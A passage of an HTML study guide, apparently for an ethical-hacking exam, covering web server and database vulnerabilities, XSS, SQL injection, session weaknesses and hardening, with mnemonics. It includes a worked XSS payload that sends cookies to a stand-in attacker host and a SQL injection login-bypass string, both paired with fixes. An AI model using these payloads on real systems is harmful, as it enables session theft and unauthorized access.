+      <h2 class="gc">Web Server Vulnerabilities &amp; Attacks</h2>
+
+      <h3 class="ta">The Named Vulnerability List</h3>
+      <div class="def-grid">
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">Buffer Overflow</div>
+          <div class="def-desc">Overfilling a memory buffer to corrupt adjacent memory / execute code.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">DoS / DDoS</div>
+          <div class="def-desc">Flooding the server (from one or many sources) so it can't serve legitimate users.
+          </div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--c)"></div>
+          <div class="def-term tc">Banner Information</div>
+          <div class="def-desc">Server software/version leaks that tell an attacker exactly what to exploit.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--d)"></div>
+          <div class="def-term td">Permissions</div>
+          <div class="def-desc">Incorrectly assigned permissions expose files/locations that should be off-limits.
+          </div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--e)"></div>
+          <div class="def-term te">Error Messages</div>
+          <div class="def-desc">Verbose errors that leak stack traces, paths, or query structure.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--f)"></div>
+          <div class="def-term tf">Unnecessary Features</div>
+          <div class="def-desc">Unused services/modules left enabled, expanding the attack surface.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">User Accounts</div>
+          <div class="def-desc">Default/leftover accounts an attacker can discover and reuse.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">SQL Injection</div>
+          <div class="def-desc">Malicious SQL passed through input fields to the database backend.</div>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🖥️</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - Web Server Vulnerabilities: "Big Dogs Bark, People Even Fear Unfriendly Snakes"</h4>
+          <p><span class="mnem-key">B-D-B-P-E-F-U-S</span> = <strong>B</strong>uffer overflow,
+            <strong>D</strong>oS/DDoS,
+            <strong>B</strong>anner info, <strong>P</strong>ermissions, <strong>E</strong>rror messages,
+            <strong>F</strong>eatures (unnecessary), <strong>U</strong>ser accounts, <strong>S</strong>QL injection.
+            Eight named vulnerabilities from the slide, one weird sentence.
+          </p>
+        </div>
+      </div>
+
+      <h3 class="tb" style="margin-top:1.5rem;">The Named Attacks</h3>
+      <div class="grid2">
+        <div class="card bl-a">
+          <h3 class="ta">DNS Server Hijacking</h3>
+          <p>DNS resolves a domain name to an IP address. In DNS server hijacking, the attacker compromises the DNS
+            server and changes its mapping settings to point toward a <strong>rogue DNS server</strong>. When a user
+            types a legitimate URL, the poisoned settings redirect them to the attacker's fake site instead.</p>
+        </div>
+        <div class="card bl-b">
+          <h3 class="tb">DNS Amplification Attack</h3>
+          <p>A DDoS technique that abuses open DNS resolvers: the attacker sends small spoofed-source DNS queries that
+            trigger much larger DNS responses, all directed at the victim - "amplifying" a small request into a
+            crushing flood of traffic.</p>
+        </div>
+        <div class="card bl-c">
+          <h3 class="tc">Directory Traversal Attack</h3>
+          <p>Exploits insufficient input validation on file paths (e.g. using <span class="mono"
+              style="display:inline;padding:0.15rem 0.4rem;">../../</span> sequences) to escape the intended web root
+            and read arbitrary files elsewhere on the server's filesystem.</p>
+        </div>
+        <div class="card bl-d">
+          <h3 class="td">Man-in-the-Middle / Sniffing Attack</h3>
+          <p>The attacker positions themselves between the client and the server (or simply sniffs unencrypted
+            traffic) to intercept, read, or alter data in transit.</p>
+        </div>
+        <div class="card bl-e">
+          <h3 class="te">Web Cache Poisoning</h3>
+          <p>Attacks the reliability of an intermediate web cache. The attacker forces the server's cache to flush its
+            real content, then sends a specially crafted request so <strong>infected content gets stored in the
+              cache</strong> instead. Every user who requests that URL through the cache gets the malicious content
+            until the cache is flushed. Possible when the web server/application has <strong>HTTP
+              Response-Splitting</strong> flaws.</p>
+        </div>
+        <div class="card bl-f">
+          <h3 class="tf">Session Hijacking with Cookies</h3>
+          <p>An attacker steals or predicts a valid session cookie and replays it to impersonate the legitimate user -
+            no password needed, since the session is already "logged in."</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 4: WEB SERVER ATTACK METHODOLOGY -->
+    <section>
+      <div class="section-header"><span class="sec-num">04 / Attack Methodology</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gd">Web Server Attack Methodology</h2>
+
+      <div class="card bl-a">
+        <h3 class="ta">Banner Information</h3>
+        <p>A banner reveals information about the web server. Connecting to <strong>port 80 (HTTP)</strong> is the
+          classic way to receive and read a web server's banner - which usually names the software and version, handing
+          the attacker a shortlist of known exploits.</p>
+      </div>
+
+      <div class="vs" style="margin-top:1rem;">
+        <div class="ex ex-b">
+          <div class="ex-label tb">Permissions (correct)</div>
+          <p>Control access to a server and its content - but can easily be misconfigured.</p>
+        </div>
+        <div class="ex ex-c">
+          <div class="ex-label tc">Permissions (incorrectly assigned)</div>
+          <p>Have the potential to allow access to locations on the web server that should <strong>not</strong> be
+            accessible.</p>
+        </div>
+      </div>
+
+      <div class="card bl-d" style="margin-top:1rem;">
+        <h3 class="td">Unnecessary Features</h3>
+        <p>Servers should be <strong>purpose-built</strong> for the role they fill in the organization. Anything not
+          essential to that role should be eliminated. <strong>Hardening</strong> removes features, services, and
+          applications that aren't necessary for a system to do its job - if a feature isn't needed, disable it, or
+          better yet, uninstall it.</p>
+      </div>
+
+      <div class="card bl-e" style="margin-top:1rem;">
+        <h3 class="te">User Accounts</h3>
+        <p>Most operating systems ship preconfigured with user accounts and groups already defined and in place. These
+          accounts can easily be discovered through research by an attacker, who then uses them to gain access to the
+          system.</p>
+        <h4 style="margin-top:0.75rem;font-size:0.85rem;color:var(--text);">Security Best Practices</h4>
+        <ul>
+          <li>Disable or remove default accounts</li>
+          <li>Create new ones that correspond to how an administrator will actually use the service</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- SECTION 5: WEB APPLICATION ATTACKS -->
+    <section>
+      <div class="section-header"><span class="sec-num">05 / Web Application Attacks</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="ga">When the Code on Top Is the Weak Link</h2>
+      <p>Even if a web server is configured securely and sits behind a firewall, a <strong>poorly coded web
+          application</strong> deployed on top of it can still hand an attacker a way in. If developers skip secure
+        coding practices, attackers get the chance to exploit application-level vulnerabilities and compromise both the
+        app and the underlying server.</p>
+
+      <div class="def-grid">
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">Cookie Tampering</div>
+          <div class="def-desc">Modifying a cookie in transit from client to server. Tools exist to edit both
+            persistent and non-persistent cookies.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">Unvalidated Input &amp; File Injection</div>
+          <div class="def-desc">Supplying unvalidated input, or injecting files, into a web application that trusts
+            its input too much.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--c)"></div>
+          <div class="def-term tc">Cross-Site Scripting (XSS)</div>
+          <div class="def-desc">An injection attack where malicious scripts are injected into otherwise trusted
+            websites, then delivered - usually as browser-side script - to a different end user.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--d)"></div>
+          <div class="def-term td">SQL Injection</div>
+          <div class="def-desc">Exploits a database's inability to distinguish code from data. The attacker injects
+            malicious code into strings that are later passed to the SQL server for execution.</div>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🧠</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - The Four Web App Attacks: "Cats Understand XML SQL"</h4>
+          <p><span class="mnem-key">C-U-X-S</span> = <strong>C</strong>ookie tampering, <strong>U</strong>nvalidated
+            input/file injection, <strong>X</strong>SS, <strong>S</strong>QL injection - exactly the four the slides
+            call out under "Web Application Attacks."</p>
+        </div>
+      </div>
+
+      <h3 class="tb" style="margin-top:1.75rem;">XSS in Practice - Three Flavors (Enrichment)</h3>
+      <p>The slides name XSS as "malicious script injected into a trusted site, delivered to another user" - in
+        practice, that plays out in three well-known ways worth knowing cold:</p>
+      <div class="grid3">
+        <div class="card bl-a">
+          <h3 class="ta">Reflected XSS</h3>
+          <p>The payload rides in the request (e.g. a URL parameter) and is immediately "reflected" back in the
+            response - only the person who clicks the crafted link is affected.</p>
+        </div>
+        <div class="card bl-b">
+          <h3 class="tb">Stored XSS</h3>
+          <p>The payload is saved server-side (e.g. in a comment or profile field) and served to <strong>every</strong>
+            visitor who views that page - much more dangerous, no crafted link needed.</p>
+        </div>
+        <div class="card bl-c">
+          <h3 class="tc">DOM-Based XSS</h3>
+          <p>The vulnerability lives entirely in client-side JavaScript that unsafely writes attacker-controlled data
+            into the page's DOM - the server may never even see the malicious payload.</p>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">💉</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - XSS Types: "RSD"</h4>
+          <p><span class="mnem-key">R-S-D</span> = <strong>R</strong>eflected (bounces back once),
+            <strong>S</strong>tored
+            (sticks around for everyone), <strong>D</strong>OM-based (never leaves the browser). Think "Reflected once,
+            Stored forever, DOM never left home."</p>
+        </div>
+      </div>
+
+      <div class="ex ex-c">
+        <div class="ex-label tc">Worked Example - A Reflected XSS Payload</div>
+        <p>Imagine a search box that echoes your query straight back into the page: <code
+            style="font-family:'JetBrains Mono',monospace;">Results for: [your input]</code></p>
+        <div class="mono"><span class="comment">// Vulnerable search box submits:</span>
+          &lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;
+
+          <span class="comment">// If the app prints the query back into the page unescaped,</span>
+          <span class="comment">// this script runs in the victim's browser and ships their cookie to the
+            attacker.</span>
+        </div>
+        <p style="margin-top:0.75rem;"><strong>Fix:</strong> HTML-encode/escape all user-supplied output before it's
+          rendered, and use a Content-Security-Policy to block inline scripts.</p>
+      </div>
+    </section>
+
+    <!-- SECTION 6: SQL INJECTION DEEP DIVE (ENRICHMENT) -->
+    <section>
+      <div class="section-header"><span class="sec-num">06 / SQL Injection Deep Dive</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gb">SQL Injection: How the "Malicious Code in a String" Attack Actually Works</h2>
+      <p>The slides define SQL injection simply: the attacker <strong>injects malicious code into strings later passed
+          to the SQL server for execution</strong>. In practice, this happens whenever user input is concatenated
+        directly into a SQL query instead of being safely parameterized. Below is a worked walkthrough plus the
+        standard categories of SQLi you'll see referenced across the ethical-hacking literature and tools.</p>
+
+      <div class="ex ex-b">
+        <div class="ex-label tb">Worked Example - Classic Login Bypass</div>
+        <p>A vulnerable login query built by string concatenation:</p>
+        <div class="mono">SELECT * FROM users WHERE username = '<span class="key">$user</span>' AND password = '<span
+            class="key">$pass</span>';</div>
+        <p style="margin-top:0.75rem;">If the attacker types this into the <strong>username</strong> field:</p>
+        <div class="mono">' OR '1'='1' -- </div>
+        <p style="margin-top:0.75rem;">the query the database actually executes becomes:</p>
+        <div class="mono">SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...';</div>
+        <p style="margin-top:0.75rem;">Since <code style="font-family:'JetBrains Mono',monospace;">'1'='1'</code> is
+          always true and
+          <code style="font-family:'JetBrains Mono',monospace;">--</code> comments out the rest of the line, the
+          password check never runs - the attacker is logged in as the first user in the table, no valid credentials
+          needed.
+        </p>
+      </div>
+
+      <h3 class="tc" style="margin-top:1.5rem;">Categories of SQL Injection</h3>
+      <div class="grid2">
+        <div class="card bl-a">
+          <h3 class="ta">In-Band SQLi</h3>
+          <p>The attacker uses the same channel to launch the attack and gather results - the most common and easiest
+            to exploit. Includes both <strong>error-based</strong> and <strong>union-based</strong> SQLi.</p>
+        </div>
+        <div class="card bl-b">
+          <h3 class="tb">Blind SQLi</h3>
+          <p>No data is returned directly in the response. The attacker infers information indirectly - via true/false
+            behavior (<strong>boolean-based</strong>) or response timing (<strong>time-based</strong>).</p>
+        </div>
+      </div>
+      <div class="def-grid" style="margin-top:0.75rem;">
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">Error-Based</div>
+          <div class="def-desc">Deliberately triggers a database error that leaks table/column names or data in the
+            error message itself.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">Union-Based</div>
+          <div class="def-desc">Uses the SQL <code style="font-family:'JetBrains Mono',monospace;">UNION</code> operator
+            to append a second query and pull
+            extra data into the visible results.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--c)"></div>
+          <div class="def-term tc">Boolean-Based Blind</div>
+          <div class="def-desc">Asks the database true/false questions; the page behaves differently depending on the
+            answer (e.g. content changes or doesn't).</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--d)"></div>
+          <div class="def-term td">Time-Based Blind</div>
+          <div class="def-desc">Injects a delay (e.g. <code
+              style="font-family:'JetBrains Mono',monospace;">SLEEP(5)</code>) and infers truth from how long the
+            response takes.</div>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🧠</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - SQLi Types: "EUBT"</h4>
+          <p><span class="mnem-key">E-U-B-T</span> = <strong>E</strong>rror-based, <strong>U</strong>nion-based (both
+            in-band), <strong>B</strong>oolean-blind, <strong>T</strong>ime-blind (both blind). "Every Ugly Bug Talks" -
+            eventually, one way or another, the database always talks.</p>
+        </div>
+      </div>
+
+      <h3 class="td" style="margin-top:1.5rem;">Common Tools</h3>
+      <div class="grid2">
+        <div class="card bl-e">
+          <h3 class="te">sqlmap</h3>
+          <p>The industry-standard automated tool for detecting and exploiting SQL injection, enumerating databases,
+            dumping data, and even gaining OS-level access through a vulnerable DB connection.</p>
+        </div>
+        <div class="card bl-f">
+          <h3 class="tf">Burp Suite</h3>
+          <p>An intercepting proxy used to capture, inspect, and modify HTTP requests - the standard way testers craft
+            and replay SQLi/XSS payloads by hand before (or instead of) automating with sqlmap.</p>
+        </div>
+      </div>
+
+      <div class="tip tip-warn">
+        <div class="tip-icon">⚠️</div>
+        <div class="tip-body">
+          <h4 class="te">Defense: Parameterize, Don't Concatenate</h4>
+          <p>The single most effective countermeasure is <strong>parameterized queries / prepared statements</strong> -
+            user input is always treated as data, never as executable SQL. Pair this with input validation,
+            least-privilege database accounts, and stored procedures used correctly (not as a substitute for
+            parameterization).</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 7: SESSION MANAGEMENT & ENCRYPTION -->
+    <section>
+      <div class="section-header"><span class="sec-num">07 / Session &amp; Encryption</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gc">Session Management Issues &amp; Encryption Weaknesses</h2>
+
+      <div class="card bl-a">
+        <h3 class="ta">What Is a Session?</h3>
+        <p>A session represents the connection a client has with the server application. It typically has a
+          <strong>unique identifier</strong>, some form of <strong>encryption</strong>, and other parameters. Session
+          information is high-value: if an attacker gets it, they get access to confidential information without
+          needing to authenticate normally.
+        </p>
+      </div>
+
+      <h3 class="tb" style="margin-top:1.5rem;">Session Vulnerabilities</h3>
+      <ul>
+        <li>Long-lived sessions that never expire</li>
+        <li>Missing or broken logout features</li>
+        <li>Insecure or weak session identifiers</li>
+        <li>Granting session IDs to unauthorized users</li>
+        <li>Absent or inadequate password change controls</li>
+        <li>Inclusion of unprotected information in cookies</li>
+      </ul>
+
+      <h3 class="tc" style="margin-top:1.5rem;">Encryption Weaknesses</h3>
+      <div class="vs">
+        <div class="ex ex-c">
+          <div class="ex-label tc">Weak Ciphers</div>
+          <p>Use short keys or are poorly designed/implemented, which lets an attacker decrypt data easily and gain
+            unauthorized access.</p>
+        </div>
+        <div class="ex ex-d">
+          <div class="ex-label td">Vulnerable Software</div>
+          <p>Implementations such as <strong>SSL</strong> may themselves have poor programming, undermining whatever
+            encryption strength the algorithm was supposed to provide.</p>
+        </div>
+      </div>
+
+      <div class="tip tip-yellow">
+        <div class="tip-icon">⭐</div>
+        <div class="tip-body">
+          <h4 class="tf">Exam Trivia Note</h4>
+          <p>The six session vulnerabilities above are a classic multiple-select exam list - know them as a set, not
+            just individually.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 8: DATABASE ATTACKS OVERVIEW -->
+    <section>
+      <div class="section-header"><span class="sec-num">08 / Database Attacks</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gd">Database Attacks &amp; Vulnerabilities</h2>
+      <p>Databases store an organization's most critical and sensitive information, and they're almost always
+        <strong>connected to web applications</strong> that sit exposed on the internet. A single weakness anywhere in
+        that chain can expose the entire system - which makes databases high-value attack targets.
+      </p>
+
+      <h3 class="ta" style="margin-top:1rem;">Database Vulnerabilities</h3>
+      <div class="grid3">
+        <div class="card bl-a">
+          <ul>
+            <li>Weak or default passwords</li>
+            <li>Excessive user privileges</li>
+            <li>Unpatched database software</li>
+            <li>Insecure configuration</li>
+            <li>Lack of encryption</li>
+          </ul>
+        </div>
+        <div class="card bl-b">
+          <ul>
+            <li>Shared database accounts</li>
+            <li>Weak authentication mechanisms</li>
+            <li>No role-based access control</li>
+            <li>Open database ports</li>
+            <li>Poor backup protection</li>
+          </ul>
+        </div>
+        <div class="card bl-c">
+          <ul>
+            <li>Default settings left unchanged</li>
+            <li>Unnecessary database services enabled</li>
+            <li>Weak auditing and logging</li>
+            <li>Inadequate monitoring</li>
+            <li>Human configuration errors</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🗄️</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - 15 Database Vulnerabilities in 5 Buckets</h4>
+          <p>Group them as <span class="mnem-key">Credentials</span> (weak/default/shared passwords, weak auth),
+            <span class="mnem-key">Access Control</span> (excessive privileges, no RBAC), <span
+              class="mnem-key">Patching/Config</span> (unpatched, insecure/default config, unnecessary services, open
+            ports), <span class="mnem-key">Visibility</span> (weak logging, inadequate monitoring), and <span
+              class="mnem-key">Resilience</span> (no encryption, poor backups, human error). Five buckets are far
+            easier to recall than fifteen bullets.
+          </p>
+        </div>
+      </div>
+
+      <h3 class="tb" style="margin-top:1.75rem;">Named Database Attacks</h3>
+      <div class="def-grid">
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">SQL Injection</div>
+          <div class="def-desc">The headline database attack (see deep dive above).</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">Credential Brute-Force</div>
+          <div class="def-desc">Repeatedly guessing database account passwords.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--c)"></div>
+          <div class="def-term tc">Privilege Escalation</div>
+          <div class="def-desc">Turning a low-privilege database account into an admin one.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--d)"></div>
+          <div class="def-term td">Unauthorized Data Access</div>
+          <div class="def-desc">Reading data the attacker was never meant to see.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--e)"></div>
+          <div class="def-term te">Data Manipulation</div>
+          <div class="def-desc">Modifying records to commit fraud or sabotage.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--f)"></div>
+          <div class="def-term tf">Abuse of Stored Procedures</div>
+          <div class="def-desc">Misusing built-in stored procedures to execute unintended commands.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">Exploiting Misconfigured Permissions</div>
+          <div class="def-desc">Riding excessive/incorrect grants straight to sensitive tables.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">Password Cracking</div>
+          <div class="def-desc">Offline/online cracking of captured database credential hashes.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--c)"></div>
+          <div class="def-term tc">Bypassing Authentication Controls</div>
+          <div class="def-desc">Getting past login checks entirely, often via injection.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--d)"></div>
+          <div class="def-term td">Insider Attacks</div>
+          <div class="def-desc">Abuse of legitimate access by someone already inside the organization.</div>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🧠</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - 10 Database Attacks: "Sneaky Crooks Prefer Unlocked Doors, Manipulating Stolen Passwords,
+            Evading Bypassed Insiders"</h4>
+          <p><span class="mnem-key">S-C-P-U-D-M-S-P-E-B-I</span> ≈ <strong>S</strong>QL injection,
+            <strong>C</strong>redential brute-force, <strong>P</strong>rivilege escalation,
+            <strong>U</strong>nauthorized
+            data access, <strong>D</strong>ata manipulation, abuse of <strong>S</strong>tored procedures, exploiting
+            misconfigured <strong>P</strong>ermissions, password cracking, <strong>B</strong>ypassing authentication,
+            <strong>I</strong>nsider attacks. Ten attack types, one long crime-scene sentence.
+          </p>
+        </div>
+      </div>
+
+      <h3 class="tc" style="margin-top:1.75rem;">Impact of Database Attacks</h3>
+      <div class="flow">
+        <div class="flow-box accent">Data Theft</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box accent2">Tampering / Deletion</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box accent3">Loss of Confidentiality &amp; Integrity</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box">Service Disruption</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box accent">Legal &amp; Reputational Damage</div>
+      </div>
+    </section>
+
+    <!-- SECTION 9: LOCATING DATABASES & TOOLS -->
+    <section>
+      <div class="section-header"><span class="sec-num">09 / Locating &amp; Cracking</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="ga">Locating Databases on the Network &amp; Cracking Passwords</h2>
+      <p>Before an attacker can hit a database, they first have to <strong>find</strong> it - including "rogue" or
+        unknown database installations that IT doesn't even know exist.</p>
+
+      <div class="grid3">
+        <div class="card bl-a">
+          <h3 class="ta">Network Database Scanner</h3>
+          <p>Effective at locating rogue or unknown database installations across the network.</p>
+        </div>
+        <div class="card bl-b">
+          <h3 class="tb">SQLRecon</h3>
+          <p>Similar to a network database scanner, but specifically targets <strong>Microsoft SQL Server</strong>
+            installations.</p>
+        </div>
+        <div class="card bl-c">
+          <h3 class="tc">Oscanner</h3>
+          <p>A scanner purpose-built for finding and enumerating <strong>Oracle</strong> installations.</p>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🔍</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - Database-Locating Tools: "NSO"</h4>
+          <p><span class="mnem-key">N-S-O</span> = <strong>N</strong>etwork Database Scanner (general/rogue DBs),
+            <strong>S</strong>QLRecon (Microsoft SQL), <strong>O</strong>scanner (Oracle). Say it like the name "N-S-O"
+            -
+            three tools, three targets.
+          </p>
+        </div>
+      </div>
+
+      <h3 class="td" style="margin-top:1.75rem;">Database Server Password Cracking</h3>
+      <div class="grid3">
+        <div class="card bl-d">
+          <h3 class="td">SQLPing3</h3>
+          <p>A password-cracking tool aimed specifically at SQL Server.</p>
+        </div>
+        <div class="card bl-e">
+          <h3 class="te">Cain &amp; Abel</h3>
+          <p>A general-purpose password recovery/cracking tool, also used against database credentials.</p>
+        </div>
+        <div class="card bl-f">
+          <h3 class="tf">Dictionary-Based Cracking</h3>
+          <p>The underlying method both tools rely on - trying a curated wordlist of likely passwords rather than
+            brute-forcing every possible combination.</p>
+        </div>
+      </div>
+
+      <h3 class="ta" style="margin-top:1.75rem;">Locating Vulnerabilities in Databases</h3>
+      <p>Once inside striking distance, attackers (and pen testers) look for:</p>
+      <ul>
+        <li>Unused/misused stored procedures</li>
+        <li>Service account privilege issues</li>
+        <li>Weak or poor authentication methods enabled</li>
+        <li>No or limited audit log settings</li>
+      </ul>
+    </section>
+
+    <!-- SECTION 10: DATABASE DEFENSE -->
+    <section>
+      <div class="section-header"><span class="sec-num">10 / Database Defense</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gb">"Out of Sight, Out of Mind" - Hardening the Database</h2>
+      <p>The slides frame database defense under the heading "Out of Sight, Out of Mind" - the less visible and less
+        exposed the database is, the harder it is to attack.</p>
+
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <h4>Learn the Security Features in the Database System</h4>
+            <p>You can't turn on protections you don't know exist - know your platform's built-in security controls.
+            </p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <h4>Evaluate the Use of Nonstandard Ports</h4>
+            <p>Running the database on a nonstandard port won't stop a determined attacker, but it removes the database
+              from casual/automated default-port scans.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <h4>Keep Up to Date</h4>
+            <p>Apply patches promptly - unpatched database software is one of the core vulnerabilities listed above.
+            </p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <h4>Secure the Operating System</h4>
+            <p>A database is only as secure as the OS underneath it - harden the host, not just the DB engine.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">5</div>
+          <div class="step-body">
+            <h4>Use a Firewall</h4>
+            <p>Restrict who can even reach the database port in the first place.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🧠</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - Database Defense: "LEKSF"</h4>
+          <p><span class="mnem-key">L-E-K-S-F</span> = <strong>L</strong>earn the security features,
+            <strong>E</strong>valuate nonstandard ports, <strong>K</strong>eep up to date, <strong>S</strong>ecure the
+            OS, use a <strong>F</strong>irewall. Five steps, "Out of Sight, Out of Mind."
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- EXAM TIPS -->
+    <section>
+      <div class="section-header"><span class="sec-num">11 / Exam Tips</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gc">Exam Tips &amp; Tricks</h2>
+      <div class="grid2">
+        <div class="tip tip-green">
+          <div class="tip-icon">✅</div>
+          <div class="tip-body">
+            <h4 class="td">Why Attackers Moved to the Web Layer</h4>
+            <p>Network defenses (firewalls, IDS/IPS) handle network-level attacks well, pushing attackers toward web
+              servers and web applications instead.</p>
+          </div>
+        </div>
+        <div class="tip tip-blue">
+          <div class="tip-icon">💡</div>
+          <div class="tip-body">
+            <h4 class="ta">8 Web Server Vulnerabilities</h4>
+            <p>Buffer overflow, DoS/DDoS, banner info, permissions, error messages, unnecessary features, user
+              accounts, SQL injection - "Big Dogs Bark, People Even Fear Unfriendly Snakes."</p>
+          </div>
+        </div>
+        <div class="tip tip-warn">
+          <div class="tip-icon">⚠️</div>
+          <div class="tip-body">
+            <h4 class="te">Web Cache Poisoning Needs HTTP Response-Splitting</h4>
+            <p>Web cache poisoning attacks are only possible if the web server/application has HTTP Response-Splitting
+              flaws - remember that precondition.</p>
+          </div>
+        </div>
+        <div class="tip tip-yellow">
+          <div class="tip-icon">⭐</div>
+          <div class="tip-body">
+            <h4 class="tf">4 Web Application Attacks</h4>
+            <p>Cookie tampering, unvalidated input/file injection, XSS, SQL injection - "Cats Understand XML SQL."</p>
+          </div>
+        </div>
+        <div class="tip tip-green">
+          <div class="tip-icon">✅</div>
+          <div class="tip-body">
+            <h4 class="td">Reflected vs Stored vs DOM XSS</h4>
+            <p>Reflected = bounces back once via a crafted link. Stored = saved server-side, hits every viewer. DOM =
+              lives entirely in client-side JS.</p>
+          </div>
+        </div>
+        <div class="tip tip-blue">
+          <div class="tip-icon">💡</div>
+          <div class="tip-body">
+            <h4 class="ta">SQLi = Code Injected Into a String</h4>
+            <p>The exact slide definition: attacker injects malicious code into strings later passed to the SQL server
+              for execution - remember this phrasing.</p>
+          </div>
+        </div>
+        <div class="tip tip-warn">
+          <div class="tip-icon">⚠️</div>
+          <div class="tip-body">
+            <h4 class="te">3 Database-Locating Tools = 3 Targets</h4>
+            <p>Network Database Scanner (general/rogue), SQLRecon (Microsoft SQL), Oscanner (Oracle) - each maps to a
+              specific platform.</p>
+          </div>
+        </div>
+        <div class="tip tip-yellow">
+          <div class="tip-icon">⭐</div>
+          <div class="tip-body">
+            <h4 class="tf">SQLPing3 &amp; Cain and Abel = DB Password Cracking</h4>
+            <p>Both named tools rely on dictionary-based cracking methods against database credentials.</p>
+          </div>
+        </div>
+        <div class="tip tip-green">
+          <div class="tip-icon">✅</div>
+          <div class="tip-body">
+            <h4 class="td">"Out of Sight, Out of Mind" = 5 Defenses</h4>
+            <p>Learn security features, evaluate nonstandard ports, keep up to date, secure the OS, use a firewall -
+              "LEKSF."</p>
+          </div>
+        </div>
+        <div class="tip tip-blue">
+          <div class="tip-icon">💡</div>
+          <div class="tip-body">
+            <h4 class="ta">6 Session Vulnerabilities</h4>
+            <p>Long-lived sessions, missing logout, weak session IDs, IDs given to unauthorized users, no password
+              change controls, unprotected cookie data.</p>
+          </div>
+        </div>
+        <div class="tip tip-warn">
+          <div class="tip-icon">⚠️</div>
+          <div class="tip-body">
+            <h4 class="te">Weak Ciphers vs Vulnerable Software</h4>
+            <p>Weak ciphers = short/poorly designed keys. Vulnerable software = the implementation itself (e.g. SSL) is
+              poorly programmed - two different failure points.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- QUICK REFERENCE -->
+    <section>
+      <div class="section-header"><span class="sec-num">12 / Cheat Sheet</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gd">Quick Reference - Everything at a Glance</h2>
+      <div class="tbl-wrap">
+        <table class="tbl">
+          <thead>
